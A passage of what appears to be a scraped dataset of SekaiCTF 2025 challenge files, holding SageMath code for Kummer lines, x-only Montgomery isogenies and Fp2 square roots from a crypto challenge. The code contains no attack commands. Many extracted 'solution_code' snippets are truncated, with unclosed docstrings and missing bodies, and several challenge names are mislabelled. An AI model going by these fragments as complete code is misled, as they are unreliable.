self._Z\n\n\n    def X(self):\n        return self._X\n    def Z(self):\n        return self._Z\n\n\n    def __iter__(self):\n        return iter(self.XZ())\n\n\n    def x(self):\n        r\"\"\" \"\"\"\n        if not self._Z:\n            raise ValueError(\"The identity point has no valid x-coordinate\")\n        if self._Z == 1:\n            return self._base_ring(self._X)\n        return self._base_ring(self._X / self._Z)\n\n\n    @cached_method\n    def curve_point(self):\n        \"\"\"\n        Deterministically lift an x-coordinate\n        taking the smallest y-coordinate as the\n        chosen root.\n        \"\"\"\n        # Get the Montgomery curve and constant A\n        L = self.parent()\n        E = L.curve()\n        A = L.a()\n\n\n    @staticmethod\n    def xDBL(X, Z, A, C):\n        \"\"\"\n        function for Montgomery doubling with projective curve constant\n\n\n    @staticmethod\n    def xADD(XP, ZP, XQ, ZQ, xPQ, zPQ):\n        \"\"\"\n        function for Montgomery differential addition\n\n\n    @staticmethod\n    def xDBLADD(XP, ZP, XQ, ZQ, xPQ, zPQ, A24, C24):\n        \"\"\"\n        function for step in Montgomery ladder\n        simultaneous doubling and differential addition\n\n\n    @staticmethod\n    def xTPL(XP, ZP, A2):\n        \"\"\"\n        SIKE algorithm 46\n\n\n    def _double(self):\n        \"\"\"\n        Returns [2] self\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        X2, Z2 = self.xDBL(X, Z, A, C)\n        return self._parent((X2, Z2))\n\n\n    def double(self):\n        \"\"\"\n        Wrapper function which deals with the doubling of\n        the identity\n\n\n    def _double_iter(self, n):\n        \"\"\"\n        Returns [2^n] self, faster than generic\n        multiplication as we only need doubling,\n        no addition.\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        for _ in range(n):\n            X, Z = self.xDBL(X, Z, A, C)\n        return self._parent((X, Z))\n\n\n    def double_iter(self, n):\n        \"\"\"\n        Wrapper function which deals with the repeated\n        doubling\n\n\n    def _triple_iter(self, n):\n        \"\"\"\n        Returns [3^n] self, faster than generic\n        multiplication as we only need doubling,\n        no addition.\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        A = A / (2 * C)\n        for _ in range(n):\n            X, Z = self.xTPL(X, Z, A)\n        return self._parent((X, Z))\n\n\n    def triple_iter(self, n):\n        \"\"\"\n        Wrapper function which deals with the repeated\n        tripling\n\n\n    def _add(self, Q, PQ):\n        \"\"\"\n        Performs differential addition assuming\n        P, Q and PQ are all not the point at\n        infinity\n        \"\"\"\n        XP, ZP = self.XZ()\n        XQ, ZQ = Q.XZ()\n        XPQ, ZPQ = PQ.XZ()\n\n\n    def add(self, Q, PQ):\n        \"\"\"\n        Function to perform differential addition and\n        handle the cases when P, Q or PQ are the points\n        at infinity\n        \"\"\"\n        # Adding O + Q = Q\n        if not self._Z:\n            return Q\n\n\n    def __mul__(self, m):\n        \"\"\"\n        Montgomery-ladder to compute [m]P\n\n\n    def __rmul__(self, m):\n        return self * m\n\n\n    def __imul__(self, m):\n        self = self * m\n        return self\n\n\n    def ladder_3_pt(self, xP, xPQ, m):\n        \"\"\"\n        Function to compute xP + [m]xQ using x-only\n        arithmetic. Very similar to the Montgomery ladder above\n\n\n    def multiples(self):\n        \"\"\"\n        A generator of points [l]P for self = P\n        Stops when it has generated the full subgroup generated by P\n        (without the identity point).\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\solution\\montgomery_isogenies\\kummer_line.py", "file_size": 37056, "scraped_at": "2025-10-26T18:19:39.685044"}
{"id": "project-sekai_sekaictf-2025_============================================_#", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "============================================ #", "attack_type": "Unknown", "writeup": "# ============================================ #\n#     Fast square root and quadratic roots     #\n# ============================================ #\n\n\ndef sqrt_Fp2(a):\n    \"\"\"\n    Efficiently computes the sqrt\n    of an element in Fp2 using that\n    we always have a prime p such that\n    p ≡ 3 mod 4.\n    \"\"\"\n    Fp2 = a.parent()\n    p = Fp2.characteristic()\n    i = Fp2.gen()  # i = √-1\n\n    a1 = a ** ((p - 3) // 4)\n    x0 = a1 * a\n    alpha = a1 * x0\n\n    if alpha == -1:\n        x = i * x0\n    else:\n        b = (1 + alpha) ** ((p - 1) // 2)\n        x = b * x0\n\n    return x\n\n\ndef quadratic_roots(b, c):\n    \"\"\"\n    Computes roots to the quadratic polynomial\n\n        f = x^2 + b * x + c\n\n    Using the quadratic formula\n\n    Just like in school!\n    \"\"\"\n    d2 = b**2 - 4 * c\n    d = sqrt_Fp2(d2)\n    return ((-b + d) / 2, -(b + d) / 2)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\solution\\utilities\\fast_roots.py", "file_size": 841, "scraped_at": "2025-10-26T18:19:39.700553"}
{"id": "project-sekai_sekaictf-2025_Sage_imports", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Sage imports", "attack_type": "ECC", "writeup": "\"\"\"\nUnderneath everything, our isogenies are on the Kummer line\n\nL : x^3 + Ax^2 + x\n\nAnd we perform our x-only isogenies by working with the x-coordinates\nrepresented projectively as x(P) = (X : Z) which we call KummerPoints\n\nHowever, for FESTA(+) we always need the full point eventually for either\nadditions or the (2,2)-isogeny, so we need a way to recover the full point.\n\nThe trick we use is that we always evaluate our isogenies on torsion bases, \nso we can use the Weil pairing to recover phi(P) up to an overall sign.\n\nThis file takes elliptic curves and points on these curves, maps them to the\nKummer line, performs fast x-only isogeny computations and then lifts the\nresult back to full points on the codomain curves.\n\"\"\"\n\n# Sage imports\nfrom sage.all import gcd, randint\nfrom sage.structure.element import RingElement\n\n# Local Imports\nfrom montgomery_isogenies.kummer_line import KummerLine\nfrom montgomery_isogenies.kummer_isogeny import KummerLineIsogeny\nfrom utilities.supersingular import torsion_basis\nfrom utilities.pairing import weil_pairing_pari\n\n# =========================================================== #\n#    Compute an isogeny and codomain using x-only algorithms  #\n# =========================================================== #\n\ndef _random_isogeny_x_only(E, D):\n    \"\"\"\n    Helper function to compute one step in the isogeny\n    chain for `random_isogeny_x_only`. \n    \"\"\"\n    # Compute a random point of order D to act as our\n    # isogeny kernel\n    k = randint(0, D)\n    P, Q = torsion_basis(E, D)\n    K = P + k*Q\n\n    # Map curve and kernel to Kummer Line\n    L = KummerLine(E)\n    xK = L(K[0])\n\n    # Use x-only arithmetic to compute an isogeny \n    # and codomain\n    phi = KummerLineIsogeny(L, xK, D)\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n    # Speed up SageMath by setting the order of the curve\n    p = E.base_ring().characteristic()\n    codomain.set_order((p+1)**2, num_checks=0)\n    \n    return phi, codomain\n\ndef random_isogeny_x_only(E, D):\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n    When D does not divide the available torsion,\n    the isogeny is computed in steps with the \n    helper function _random_isogeny_x_only\n    \"\"\"\n    deg = 1\n    phi_list = []\n    p = E.base_field().characteristic()\n\n    # Compute isogenies of degree gcd(D // deg, p+1)\n    # until an isogeny of degree D is computed\n    while deg != D:\n        next_deg = gcd(D // deg, p+1)\n        phi, E = _random_isogeny_x_only(E, next_deg)\n        deg *= next_deg\n\n        phi_list.append(phi)\n    \n    # Create a composite x-only isogeny from factors\n    phi = KummerLineIsogeny.from_factors(phi_list)\n    return phi, E\n\ndef isogeny_from_scalar_x_only(E, D, m, basis=None):\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n    The isogeny has a kernel K which is computed from\n    the canonical basis E[D] = <P,Q> and given scalar(s)\n    of the form:\n        K = P + [m]Q     or     K = [a]P + [b]Q\n    depending on whether m is a scalar, or a length two \n    tuple of scalars\n    \"\"\"\n    # Allow a precomputed basis\n    if not basis:\n        P, Q = torsion_basis(E, D)\n    else:\n        P, Q = basis\n\n    # Allow either an integer or tuple of integers\n    if isinstance(m, RingElement) or isinstance(m, int):\n        K = P + m*Q\n    else:\n        assert len(m) == 2\n        K = m[0]*P + m[1]*Q\n\n    # Map curve and kernel to Kummer Line\n    L = KummerLine(E)\n    xK = L(K)\n\n    # Use x-only arithmetic to compute an isogeny \n    # and codomain\n    phi = KummerLineIsogeny(L, xK, D)\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n    # Speed up SageMath by setting the order of the curve\n    p = E.base_ring().characteristic()\n    codomain.set_order((p+1)**2, num_checks=0)\n\n    return phi, codomain\n\n# ================================================= #\n#    Evaluate an x-only isogeny on a torsion basis  #\n# ================================================= #\n\ndef lift_image_to_curve(P, Q, ximP, ximQ, n, d):\n    \"\"\"\n    Given the torsion basis <P, Q> = E[n]\n    and the x-coordinates of the images x(phi(P))\n    and x(phi(P)) of a degree d-isogeny compute \n    the image of the full points up to an overall sign:\n        ±phi(P), ±phi(Q)\n    \"\"\"\n    # Lift the points to the curve\n    imPb = ximP.curve_point()\n    imQb = ximQ.curve_point()\n    \n    # Compute two pairings\n    pair_E0 = weil_pairing_pari(P, Q, n)\n    pair_E1 = weil_pairing_pari(imPb, imQb, n)\n    \n    # Correct the sign\n    if pair_E0**d != pair_E1:\n        imQb = -imQb\n\n    return imPb, imQb\n\ndef evaluate_isogeny_x_only(phi, P, Q, n, d):\n    \"\"\"\n    Given an x-only isogeny phi degree d, and the torsion basis\n    <P,Q> = E[n], compute the image of the torsion basis up to\n    and overall sign: ±phi(P), ±phi(Q)\n\n    Does", "solution_code": "    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n\n    # Create a composite x-only isogeny from factors\n    phi = KummerLineIsogeny.from_factors(phi_list)\n    return phi, E\n\n\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n\n    # Extract x-coordinates from points and convert to KummerPoints\n    xP, xQ = L0(P[0]), L0(Q[0])\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\dist\\montgomery_isogenies\\isogenies_x_only.py", "file_size": 5513, "scraped_at": "2025-10-26T18:19:39.703147"}
{"id": "project-sekai_sekaictf-2025_Sage_imports", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Sage imports", "attack_type": "ECC", "writeup": "\"\"\"\nImplementation of x-only isogenies between the Kummer Lines of \nMontgomery Curves\n\nTaken from:\nhttps://github.com/jack4818/KummerIsogeny\n\n===========================================================================\n\nUSAGE:\n\nphi = KummerLineIsogeny(domain, kernel, degree)\n\nThe codomain is accessed using `phi.codomain()` and the  elliptic curve \ncan be lifted from the KummerLine `phi.dodomain().curve()`.\n\nEvaluation of the isogeny is done via `phi(xQ)` for some KummerPoint `xQ`.\n\nNOTE:\n\nWhere the degree can be composite, but for efficiency needs to be smooth.\nFor a 2-isogeny, the point P = (0,0) cannot be used as a kernel \n\n========================================================================\n\nINFO:\n\nHeavily inspired by the SageMath isogeny classes, this file implements\nx-only Montgomery isogenies using the KummerLine and KummerPoint classes\nfrom `kummer_line.py` for the (co)domains and kernel points.\n\nThe algorithms in this file all come from the following literature:\n\nVélu-like algorithms:\n\n    Even torsion algorithms from: https://ia.cr/2017/1198\n    Computing Isogenies between Montgomery Curves Using the Action of (0, 0)\n    Joost Renes\n\n    Odd torsion algorithms: https://ia.cr/2017/504.pdf\n    A simple and compact algorithm for SIDH with arbitrary degree isogenies\n    Craig Costello and Huseyin Hisil\n\n    Codomain computation for velu formula from: https://ia.cr/2018/782\n    A faster way to the CSIDH\n    Michael Meyer and Steffen Reith\n\nVéluSqrt for large ell isogenies \n\n    VéluSqrt: https://velusqrt.isogeny.org/\n    Faster computation of isogenies of large prime degree\n    Daniel J. Bernstein, Luca De Feo, Antonin Leroux, Benjamin Smith\n\nFuture Work: \n\n- Optimise VéluSqrt, it seems to be underperforming with a threshold of about 1000\n  rather than 100 \n- Include isomorphisms of Kummer Lines\n- allow composition by defining __mul__ on isogenies to create a composite isogeny\n\"\"\"\n\n# Sage imports\nfrom sage.all import prod, ZZ, PolynomialRing\nfrom sage.rings.generic import ProductTree\n\n# Local imports\nfrom montgomery_isogenies.kummer_line import KummerLine, KummerPoint\n\n# =================================================== #\n# Generic class for creating an isogeny between       #\n# KummerLines of Montgomery model curves using x-only #\n# arithmetic                                          #\n# =================================================== #\n\n\nclass KummerLineIsogeny_Generic:\n    \"\"\"\n    Generic class for Kummer Line isogenies which we build on top of for\n    the Vélu, VéluSqrt and Composite isogeny classes\n    \"\"\"\n\n    def __init__(self):\n        self._degree = None\n        self._domain = None\n        self._codomain = None\n        pass\n\n    def __repr__(self):\n        return f\"Isogeny of degree {(self._degree).factor()} from {self._domain} to {self._codomain}\"\n\n    @staticmethod\n    def validate_input(domain, kernel, degree, check=True):\n        \"\"\"\n        Helper function to check the input to the isogeny class is well-formed\n        \"\"\"\n        if not isinstance(domain, KummerLine):\n            raise ValueError(f\"not a kummer line: {domain}\")\n\n        if not isinstance(kernel, KummerPoint):\n            raise ValueError(f\"not a kummer point: {kernel}\")\n\n        if kernel.parent() != domain:\n            raise ValueError(f\"Kernel {kernel} is not a point on {domain}\")\n\n        if check:\n            # TODO actually check order with has_order_D function\n            assert (\n                degree * kernel\n            ).is_zero(), \"Input point does not have correct order\"\n\n    def domain(self):\n        \"\"\"\n        Return the domain of the isogeny\n        \"\"\"\n        return self._domain\n\n    def codomain(self):\n        \"\"\"\n        Return the codomain of the isogeny\n        \"\"\"\n        return self._codomain\n\n    def degree(self):\n        \"\"\"\n        Return the degree of the isogeny\n        \"\"\"\n        return self._degree\n\n\n# =================================================== #\n# Computation of isogenies between Kummer lines using #\n# x-only formula by Costello-Hisil-Renes              #\n# =================================================== #\n\n\nclass KummerLineIsogeny_Velu(KummerLineIsogeny_Generic):\n    \"\"\"\n    Computes prime degree isogenies with Vélu-like formula.\n\n    - When ell is odd, we use Costello-Hisil (https://ia.cr/2017/504)\n    - When ell is even, we can use Renes (https://ia.cr/2017/1198) providing\n    that the kernel is not (0,0)\n\n    TODO: use isomorphisms to change the model of the curve if (0,0) is a\n    kernel point\n    \"\"\"\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n        # Set kernel and degree and domain\n        self._degree = degree\n        self._kernel = kernel\n        self._domain = domain\n\n        # Compute the codomain, we need different formula for even and\n        # odd degree\n        if self._degree == 2:\n            # We cannot use the", "solution_code": "    def __init__(self):\n        self._degree = None\n        self._domain = None\n        self._codomain = None\n        pass\n\n\n    def __repr__(self):\n        return f\"Isogeny of degree {(self._degree).factor()} from {self._domain} to {self._codomain}\"\n\n\n    @staticmethod\n    def validate_input(domain, kernel, degree, check=True):\n        \"\"\"\n        Helper function to check the input to the isogeny class is well-formed\n        \"\"\"\n        if not isinstance(domain, KummerLine):\n            raise ValueError(f\"not a kummer line: {domain}\")\n\n\n    def domain(self):\n        \"\"\"\n        Return the domain of the isogeny\n        \"\"\"\n        return self._domain\n\n\n    def codomain(self):\n        \"\"\"\n        Return the codomain of the isogeny\n        \"\"\"\n        return self._codomain\n\n\n    def degree(self):\n        \"\"\"\n        Return the degree of the isogeny\n        \"\"\"\n        return self._degree\n\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        phi(xP) evaluates the Kummer point xP\n        \"\"\"\n        if not isinstance(P, KummerPoint):\n            raise ValueError\n        if self._degree == 2:\n            return self._evaluate_isogeny_even(P)\n        return self._evaluate_isogeny(P)\n\n\n    def _precompute_edwards_multiples(self, d):\n        \"\"\"\n        These multiples are used in both codomain\n        computation and isogeny evaluation. We precompute\n        them once during initialisation and we can then\n        reuse them for every evaluation\n        \"\"\"\n        # Compute the [i]K for i in [1...d]\n        K_muls = self._kernel.multiples()\n        E_muls = []\n        for _ in range(d):\n            Ki = next(K_muls)\n            KX, KZ = Ki.XZ()\n            YE = KX - KZ\n            ZE = KX + KZ\n            E_muls.append((YE, ZE))\n        return E_muls\n\n\n    def _compute_codomain_constants(self):\n        \"\"\"\n        When ell is odd, we compute the codomain using the Meyer and Reith\n        Twised Edwards trick (https://ia.cr/2018/782)\n        \"\"\"\n        # Extract Montgomery constants\n        A, C = self._domain.extract_constants()\n\n\n    def _compute_codomain_constants_even(self):\n        \"\"\"\n        When ell is even, we compute the codomain constants\n        using Renes formula\n        \"\"\"\n        # Extract kernel point\n        XK, ZK = self._kernel.XZ()\n        assert XK, \"XK Cannot be zero\"\n\n\n    def _compute_codomain(self):\n        \"\"\"\n        Wrapper function to compute the codomain L = x^3 + x^2A' + x in\n        projective coordinates: A' = (A' : C') We use different formula\n        depending on whether the isogeny degree ell is even or odd\n        \"\"\"\n        # Compute the codomain constants, need different formula for\n        # odd and even ell\n        if self._degree == 2:\n            A_codomain, C_codomain = self._compute_codomain_constants_even()\n        else:\n            A_codomain, C_codomain = self._compute_codomain_constants()\n\n\n    def _evaluate_isogeny(self, P):\n        \"\"\"\n        Costello-Hisil (https://ia.cr/2017/504) formula for\n        evaluating an odd degree isogeny on the point P\n        \"\"\"\n        XP, ZP = P.XZ()\n        Psum = XP + ZP\n        Pdiff = XP - ZP\n\n\n        # Loop through the d-multiples, these are\n        # precomputed from the codomain computation\n        X_new, Z_new = 1, 1\n        for EY, EZ in self._edwards_multiples:\n            diff_EZ = Pdiff * EZ\n            sum_EY = EY * Psum\n            X_new *= diff_EZ + sum_EY\n            Z_new *= diff_EZ - sum_EY\n\n\n    def _evaluate_isogeny_even(self, P):\n        \"\"\"\n        Renes (https://ia.cr/2017/1198) formula for\n        evaluating an even degree isogeny on the point P\n        \"\"\"\n        XK, ZK = self._kernel.XZ()\n        assert XK, \"XK cannot be zero\"\n\n\n    r\"\"\"\n    Helper function to evaluate a resultant with `h_I` quickly,\n    using the product tree, taken from FastEllipticPolynomial\n    sage/src/sage/schemes/elliptic_curves/hom_velusqrt.py\n\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        Evaluate the isogeny phi on the point P\n        by using phi(P)\n        \"\"\"\n        if not isinstance(P, KummerPoint):\n            raise ValueError\n        return self._evaluate_isogeny(P)\n\n\n    def _hI_resultant(self, poly):\n        \"\"\"\n        Compute the resultant Res(hI, poly) where\n        hI has been computed and stored as a product tree\n        \"\"\"\n        return product_tree_resultant(self.hI_tree, poly)\n\n\n    def _hI_precomputation(self, ker, b, c):\n        r\"\"\"\n        Compute the polynomial\n\n\n    def _Fs(self, X1, X2):\n        \"\"\"\n        Elliptic Resultants for Montgomery curves\n        \"\"\"\n        X1X2 = X1 * X2\n        polys = (\n            (X1 - X2) ** 2,\n            -2 * ((X1X2 + 1) * (X1 + X2) + 2 * self.a * X1X2),\n            (X1X2 - 1) ** 2,\n        )\n        return polys\n\n\n    def _EJ_precomputation(self, ker, b):\n        \"\"\"\n        The polynomials for EJ are of the form\n\n\n    def _hK_precomputation(self, ker, ell, b, c):\n        r\"\"\"\n        Compute the polynomial\n\n\n    def _compute_codomain_constants(self):\n        \"\"\"\n        Compute the codomain constant in projective coordinates\n        (A : C) using the VéluSqrt adaptation of the Meyers-Reith\n        Twisted Edwards curve trick\n        \"\"\"\n        # These are the polynomials for alpha = 1 and alpha = -1\n        E0J = prod(F0 + F1 + F2 for F0, F1, F2 in self.EJ_parts)\n        E1J = prod(F0 - F1 + F2 for F0, F1, F2 in self.EJ_parts)\n\n\n    def _compute_codomain(self):\n        \"\"\"\n        Wrapper function to compute the codomain L = x^3 + x^2A' + x in\n        projective coordinates: A' = (A' : C')\n        \"\"\"\n        A_codomain, C_codomain = self._compute_codomain_constants()\n        F = self._domain.base_ring()\n        return KummerLine(F, [A_codomain, C_codomain])\n\n\n    def _evaluate_isogeny(self, P):\n        \"\"\"\n        Evaluate the isogeny phi at the point P\n\n\n        # Compute two polynomials from giant steps\n        EJ1 = prod((F0 * alpha + F1) * alpha + F2 for F0, F1, F2 in self.EJ_parts)\n        EJ0 = EJ1.reverse()\n\n\n    - Uses the sparse strategy from the SIDH paper for computing\n      prime power degree isogenies\n    - Uses VéluSqrt when the prime order isogeny has degree > threshold\n    \"\"\"\n\n\n    def sparse_isogeny_prime_power(P, l, e, split=0.8, threshold=1000):\n        \"\"\"\n        Compute chain of isogenies quotienting\n        out a point P of order l**e\n        https://trac.sagemath.org/ticket/34239\n        \"\"\"\n\n\n        def recursive_sparse_isogeny(Q, k):\n            assert k\n            if k == 1:  # base case\n                return [KummerLineIsogenyAlgorithm(Q.parent(), Q, l, check=False)]\n\n\n    # TODO: Deal with isomorphisms\n    # Easy option: just use the Sage isomorphisms from K.curve() and map down\n    # Better option: just write the isomorphisms of Montgomery curves\n    # I have these computed for the FESTA code, so I just have to move them\n    # around!\n    if cofactor == 1:\n        raise NotImplementedError(\n            \"Isomorphisms between Kummer Lines are not yet implemented\"\n        )\n\n\n    def __init__(self, domain, kernel, degree, check=True, threshold=1500):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        Evaluate the composite isogeny by calling phi(P)\n        \"\"\"\n        return evaluate_factored_kummer_isogeny(self._phis, P)\n\n\n    @classmethod\n    def from_factors(cls, maps):\n        \"\"\"\n        Sometimes we will have factors of some isogeny from a\n        different context and we want to simply collect them\n        together to create a single object.\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\dist\\montgomery_isogenies\\kummer_isogeny.py", "file_size": 23805, "scraped_at": "2025-10-26T18:19:39.724258"}
{"id": "project-sekai_sekaictf-2025_===================================================_#", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "=================================================== #", "attack_type": "ECC", "writeup": "\"\"\"\nImplementation of the Kummer Line of Montgomery Curves and the corresponding\nKummer Points used for x-only Montgomery curve arithmetic\n\nTaken from:\nhttps://github.com/jack4818/KummerIsogeny\n\n===========================================================================\n\nINFO: Construction\n\nA KummerLine can be constructed straight from a Montgomery curve:\n\nE = EllipticCurve(F, [0,A,0,1,0])\nK = KummerLine(E)\n\nOr, it can be constructed from the Montgomery coefficient\n\nK = KummerLine(F, A)\n\nAdditionally, we allow A = (A : C) to be stored projectively and\nwe can construct this by\n\nK = KummerLine(F, [A, C])\n\nA KummerPoint can be constructed from coordinates\n\nxP = K(X, Z)\n\nWhere x(P) = (X : Z) is the x-coordinate in projective XZ-coordinates\n\nA KummerPoint can also be made straight from an elliptic curve point\n\nE = EllipticCurve(F, [0,A,0,1,0])\nP = E.random_point()\n\nK = KummerLine(E)\nxP = K(P)\n\n===========================================================================\n\nINFO: Usage\n\nThe methods of the KummerLine class are fairly straight-forward. Currently\nmissing is a check for whether two curves are isomorphic over the base field.\n\nFor this, we need an isomorphism between KummerLines which is a TODO.\n\nFor the points, scalar multiplication is performed by n*xP\n\nAdditionally, one can call `xP.double()` to perform x-only point addition\nand xP.add(xQ, xPQ) to perform differential addition to recover xP + xQ\nwhere xPQ = x(P - Q).\n\nThe 3 point ladder `xQ.ladder_3_pt(xP, xPQ, m) computes xP + [m]xQ\n\nxP.multiples() generates values [l]xP by repeated differential addition. This\nis used for isogeny computations where we want to collect the the first d points\nfor an isogeny of degree ell = 2d+1.\n\"\"\"\nimport cypari2\n\npari = cypari2.Pari()\n\nfrom sage.all import cached_method, Integer, EllipticCurve\n\nfrom sage.structure.element import RingElement\nfrom sage.schemes.elliptic_curves.ell_generic import EllipticCurve_generic\nfrom sage.schemes.elliptic_curves.ell_point import EllipticCurvePoint_field\n\nfrom utilities.fast_roots import sqrt_Fp2\n\n# =================================================== #\n#     Class for the Kummer Line x(x^2 + Ax + 1)       #\n# =================================================== #\n\n\nclass KummerLine:\n    def __init__(self, *args):\n        self._curve = None\n\n        # Allow the creation of the Kummer Line from an EllipticCurve\n        if len(args) == 1:\n            (curve,) = args\n            if not isinstance(curve, EllipticCurve_generic):\n                raise TypeError(\"not an elliptic curve\")\n            ainvs = curve.a_invariants()\n            A, C = ainvs[1], 1\n            if ainvs != (0, A, 0, 1, 0):\n                raise ValueError(\"Must use Montgomery model\")\n            self._curve = curve\n            self._base_ring = curve.base_ring()\n\n        # Allow the creation of the Kummer line from a base field and coeffs.\n        elif len(args) == 2:\n            base_ring, curve_constants = args\n            # Extract curve constants\n            if isinstance(curve_constants, Integer) or len(curve_constants) == 1:\n                A = curve_constants\n                C = 1\n            elif len(curve_constants) == 2:\n                A, C = curve_constants\n            else:\n                raise ValueError(\n                    \"The Montgomery coefficient must either be a single scalar a, or\\\n                    a tuple [A, C] representing a = A/C.\"\n                )\n            self._base_ring = base_ring\n        else:\n            raise ValueError(\n                \"A Kummer Line must be constructed from either a Montgomery curve, or\\\n                    a base field and tuple representing the coefficient A/C = [A, C]\"\n            )\n\n        # init variables\n        self._A = self._base_ring(A)\n        self._C = self._base_ring(C)\n\n        self._A = pari(A)\n        self._C = pari(C)\n\n        # Make sure the curve is not singular\n        if (self._A**2 - 4 * self._C**2) == 0:\n            raise ValueError(\n                f\"Constants {curve_constants} do not define a Montgomery curve\"\n            )\n\n    def __eq__(self, other):\n        \"\"\"\n        Test equality of two curves\n        \"\"\"\n        if self.base_ring() != other.base_ring():\n            return False\n        return self._A * other._C == other._A * self._C\n\n    def __repr__(self):\n        \"\"\"\n        String representation of the class\n        \"\"\"\n        if self.a():\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + {self.a()}*x^2 + x over {self.base_ring()}\"\n        else:\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + x over {self.base_ring()}\"\n\n    def __call__(self, coords):\n        \"\"\"\n        Create a Kummer Point with this Kummer Line as the parent\n        \"\"\"\n        return KummerPoint(self, coords)\n\n    def base_ring(self):\n        \"\"\"\n        Return the base ring of the Kummer Line\n        \"\"\"\n        return self._base_ring\n\n    def extract_constants(self):\n        \"\"\"\n        Return the Montgomery coe", "solution_code": "    def __init__(self, *args):\n        self._curve = None\n\n\n        # Allow the creation of the Kummer Line from an EllipticCurve\n        if len(args) == 1:\n            (curve,) = args\n            if not isinstance(curve, EllipticCurve_generic):\n                raise TypeError(\"not an elliptic curve\")\n            ainvs = curve.a_invariants()\n            A, C = ainvs[1], 1\n            if ainvs != (0, A, 0, 1, 0):\n                raise ValueError(\"Must use Montgomery model\")\n            self._curve = curve\n            self._base_ring = curve.base_ring()\n\n\n        # Allow the creation of the Kummer line from a base field and coeffs.\n        elif len(args) == 2:\n            base_ring, curve_constants = args\n            # Extract curve constants\n            if isinstance(curve_constants, Integer) or len(curve_constants) == 1:\n                A = curve_constants\n                C = 1\n            elif len(curve_constants) == 2:\n                A, C = curve_constants\n            else:\n                raise ValueError(\n                    \"The Montgomery coefficient must either be a single scalar a, or\\\n                    a tuple [A, C] representing a = A/C.\"\n                )\n            self._base_ring = base_ring\n        else:\n            raise ValueError(\n                \"A Kummer Line must be constructed from either a Montgomery curve, or\\\n                    a base field and tuple representing the coefficient A/C = [A, C]\"\n            )\n\n\n    def __eq__(self, other):\n        \"\"\"\n        Test equality of two curves\n        \"\"\"\n        if self.base_ring() != other.base_ring():\n            return False\n        return self._A * other._C == other._A * self._C\n\n\n    def __repr__(self):\n        \"\"\"\n        String representation of the class\n        \"\"\"\n        if self.a():\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + {self.a()}*x^2 + x over {self.base_ring()}\"\n        else:\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + x over {self.base_ring()}\"\n\n\n    def __call__(self, coords):\n        \"\"\"\n        Create a Kummer Point with this Kummer Line as the parent\n        \"\"\"\n        return KummerPoint(self, coords)\n\n\n    def base_ring(self):\n        \"\"\"\n        Return the base ring of the Kummer Line\n        \"\"\"\n        return self._base_ring\n\n\n    def extract_constants(self):\n        \"\"\"\n        Return the Montgomery coefficient A as a tuple\n        representing the projective form (A : C)\n        \"\"\"\n        return self._A, self._C\n\n\n    def AC(self):\n        return self.extract_constants()\n\n\n    def AC24(self):\n        A,C = self.AC()\n        return A+2*C, 4*C\n\n\n    def zero(self):\n        \"\"\"\n        Return the identity point on the Kummer Line\n        \"\"\"\n        return self(None)\n\n\n    def curve(self):\n        \"\"\"\n        Lift the Kummer Line to an elliptic curve as a\n        SageMath EllipticCurve\n        \"\"\"\n        if not self._curve:\n            self._curve = self.montgomery_curve()\n        return self._curve\n\n\n    @cached_method\n    def montgomery_curve(self):\n        \"\"\"\n        Compute the Montgomery Curve associated with the\n        Kummer Line\n        \"\"\"\n        F = self.base_ring()\n        a = self.a()\n        return EllipticCurve(F, [0, a, 0, 1, 0])\n\n\n    @cached_method\n    def short_weierstrass_curve(self):\n        \"\"\"\n        Compute the Isomorphic curve in the short Weierstrass model\n        associated with the Kummer Line\n        \"\"\"\n        F = self.base_ring()\n        A = self.a()\n\n\n    @cached_method\n    def j_invariant(self):\n        \"\"\"\n        Compute the j-invariant of the Kummer Line\n        \"\"\"\n        j_num = 256 * (self._A**2 - 3 * self._C**2) ** 3\n        j_den = self._C**4 * (self._A**2 - 4 * self._C**2)\n        return j_num / j_den\n\n\n    @cached_method\n    def a(self):\n        \"\"\"\n        Compute the Montgomery coefficient as a value\n        in the base field\n        \"\"\"\n        return self._A / self._C\n\n\n    def __init__(self, parent, coords):\n        